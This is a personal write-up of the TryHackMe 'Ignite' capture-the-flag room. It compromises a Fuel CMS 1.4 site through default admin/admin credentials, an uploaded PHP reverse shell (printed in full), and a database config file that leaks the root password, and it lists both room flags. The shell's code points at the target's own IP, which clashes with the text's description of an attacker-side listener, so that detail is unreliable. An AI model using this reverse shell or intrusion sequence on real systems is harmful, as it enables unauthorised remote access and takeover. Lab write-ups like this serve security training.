# TryHackMe - Ignite
[https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)

## Target Info
- IP: 10.10.163.190
- OS: 

## 1. Enumeration
- nmap scan: `nmap -sV -O 10.10.163.190`
- Open ports: 80
- Fuel CMS Version1.4
- Using Gobuster, the following paths were discovered:
  - /assets
  - /fuel
  - /offline
- Confirmed login with ID/PASS: admin/admin

## 2. Exploitation
- Created a ZIP file containing a PHP file with a reverse shell
- Set up a listener on the attacker's server using the nc command
- Executed the PHP file from the /assets directory
- Successfully gained access to the target server

```
<?php
$ip = '10.10.163.190';
$port = 12345;
$sock=fsockopen($ip, $port);
$proc = proc_open("/bin/bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

## 3. Privilege Escalation
- Executed the following command

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Downloaded linpeas.sh to the attacker's server
- Transferred linpeas.sh to the target server
- Executed linpeas
- Found the root password in /var/www/html/fuel/application/config/database.php:
  - mememe
- Ran sudo /bin/bash to gain root privileges

## 4. Flags
- user.txt: `6470e394cbf6dab6a91682cc8585059b`
- root.txt: `b9bbcb33e11b80be759c4e844862482d`


